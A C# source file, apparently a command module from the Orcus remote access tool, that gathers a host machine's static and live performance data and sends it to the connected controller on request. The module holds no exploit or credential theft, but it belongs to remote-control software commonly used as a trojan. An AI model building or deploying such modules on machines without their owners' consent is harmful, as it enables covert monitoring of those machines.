using System;
using Orcus.Plugins;
using Orcus.Shared.Commands.LivePerformance;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.LivePerformance
{
    public class LivePerformanceCommand : Command
    {
        private LivePerformance _livePerformance;

        public override void Dispose()
        {
            _livePerformance?.Dispose();
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            Serializer serializer;
            switch ((LivePerformanceCommunication) parameter[0])
            {
                case LivePerformanceCommunication.GetStaticData:
                    var data = StaticPerformance.GetStaticPerformanceData();
                    serializer = new Serializer(typeof (StaticPerformanceData));
                    ResponseBytes((byte) LivePerformanceCommunication.ResponseStaticData, serializer.Serialize(data),
                        connectionInfo);
                    break;
                case LivePerformanceCommunication.GetUpdate:
                    if (_livePerformance == null)
                        _livePerformance = new LivePerformance();
                    var liveData = _livePerformance.GetData();
                    serializer = new Serializer(typeof (LiveData));
                    ResponseBytes((byte) LivePerformanceCommunication.ResponseUpdate, serializer.Serialize(liveData),
                        connectionInfo);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        protected override uint GetId()
        {
            return 19;
        }
    }
}